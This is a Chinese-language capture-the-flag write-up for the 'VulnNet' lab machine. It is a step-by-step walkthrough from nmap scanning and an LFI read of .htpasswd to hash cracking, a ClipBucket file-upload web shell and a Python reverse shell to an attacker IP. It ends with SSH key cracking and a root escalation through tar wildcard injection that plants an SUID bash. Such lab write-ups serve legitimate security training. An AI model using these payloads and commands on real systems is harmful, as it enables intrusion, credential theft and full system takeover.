# VulnNet

你能利用VulnNet Entertainment的错误配置吗？

=> You will have to add a machine IP with domain vulnnet.thm to your /etc/hosts

---

## 端口扫描

循例 nmap扫：

    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

进入web查看，登录按钮引导到/login，但页面不存在。

检索页面源代码，发现：

    <script src="/js/index__7ed54732.js"></script>
	<script src="/js/index__d8338055.js"></script>

在两个js中发现了：

    http://broadcast.vulnnet.thm
    http://vulnnet.thm/index.php?referer=

第一个是一个登录弹窗。

## LFI

第二个经过一番尝试，是LFI

我们的端口扫描结果告诉我们，这是apache2，并且有一个登录页面

查看/etc/apache2/apache2.conf还告诉我：

    # The following lines prevent .htaccess and .htpasswd files from being
    # viewed by Web clients.

种种线索都指向了.htpasswd这个文件，我们通过LFI查看它是否有什么东西：

    view-source:http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd

    developers:$apr1$ntOz***********7bJv0P0

## hashcat爆破

我们将使用hashcat进行爆破，我们可以通过官方的[hash示例](https://hashcat.net/wiki/doku.php?id=example_hashes)来查找与我们的hash类型一致的示例及其hash-mode

hashcat爆破：

    hashcat -a 0 -m 1600 '$apr1$ntOz2ERF$Sd6F*********7bJv0P0' /usr/share/wordlists/rockyou.txt

我们得到明文密码：

    997******mfsls

## 任意文件上传

登录进去又是一套新的系统，查看源代码披露了CMS版本号：

    ClipBucket version 4.0

searchsploit发现：

    Exploit: ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection

任意文件上传payload:

    curl -F "file=@aa.php" -F "plupload=1" -F "name=cmd.php" http://broadcast.vulnnet.thm/actions/beats_uploader.php/ -u "developers:99******fsls"

    creating file{"success":"yes","file_name":"16731578632e3053","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}

从/actions目录下就能找到CB_BEATS_UPLOAD_DIR文件夹，我们上传的文件也就在里面

## Reverse shell

打开我们上传的php一句话发现被执行了，我们尝试使用它来reverse shell

payload:

    http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/16731578632e3053.php?cmd=python3%20-c%20%27socket=__import__(%22socket%22);os=__import__(%22os%22);pty=__import__(%22pty%22);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.14.39.48%22,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22)%27

开启nc监听，成功getshell

## Cronjob

    www-data@vulnnet:/var/www/html$ cat /etc/crontab

发现，以root权限运行：

    */2   * * * *	root	/var/opt/backupsrv.sh

查看该文件权限：

    ls -la /var/opt/backupsrv.sh
    -rwxr--r-- 1 root root 530 Jan 23  2021 /var/opt/backupsrv.sh

虽然没权限修改，我们再看看内容：

    #!/bin/bash

    # Where to backup to.
    dest="/var/backups"

    # What to backup. 
    cd /home/server-management/Documents
    backup_files="*"

    # Create archive filename.
    day=$(date +%A)
    hostname=$(hostname -s)
    archive_file="$hostname-$day.tgz"

    # Print start status message.
    echo "Backing up $backup_files to $dest/$archive_file"
    date
    echo

    # Backup the files using tar.
    tar czf $dest/$archive_file $backup_files

    # Print end status message.
    echo
    echo "Backup finished"
    date

    # Long listing of files in $dest to check file sizes.
    ls -lh $dest

简单来讲，就是将/home/server-management/Documents/定时创建备份文件到/var/backups/

## 横向移动

由于我们没有server-management的读权限，自然就无法进行tar通配符注入

我们先查看/var/backups下的文件，发现有权限读取ssh-backup.tar.gz

    www-data@vulnnet:/var/backups$ cp ./ssh-backup.tar.gz /tmp
    www-data@vulnnet:/tmp$ tar -zxvf ./ssh-backup.tar.gz

将id_rsa内容保存到攻击机并修改权限：

    chmod 400 ./test1.txt

查看有几个user:

    grep home /etc/passwd

    syslog:x:102:106::/home/syslog:/usr/sbin/nologin
    server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash

## ssh2john

尝试使用私钥登录：

    ssh server-management@10.10.94.73 -i ./test1.txt

需要验证密码，我们通过ssh2john转hash，然后使用john爆破：

    ssh2john ./test1.txt > ./hash
    john --wordlist=/usr/share/wordlists/rockyou.txt ./hash

很快得到密码：

    on******yac

再次登录ssh成功：

    server-management@vulnnet:~$ cat ./user.txt

## 权限提升 - tar通配符注入

还记得刚刚的cronjob，现在我们有权限在那个文件夹动手动脚了

尝试tar通配符注入:

    server-management@vulnnet:~/Documents$ echo "cp /bin/bash /tmp/bash;chmod +s /tmp/bash" > ./getroot.sh
    server-management@vulnnet:~/Documents$ echo "" > "--checkpoint-action=exec=sh getroot.sh"
    server-management@vulnnet:~/Documents$ echo "" > "--checkpoint=1"

静等一小会，/tmp将会出现一个带suid的bash：

    ls -la /tmp
    server-management@vulnnet:~/Documents$ /tmp/bash -p
    bash-4.4# whoami
    root
    bash-4.4# cat /root/root.txt

成功getroot
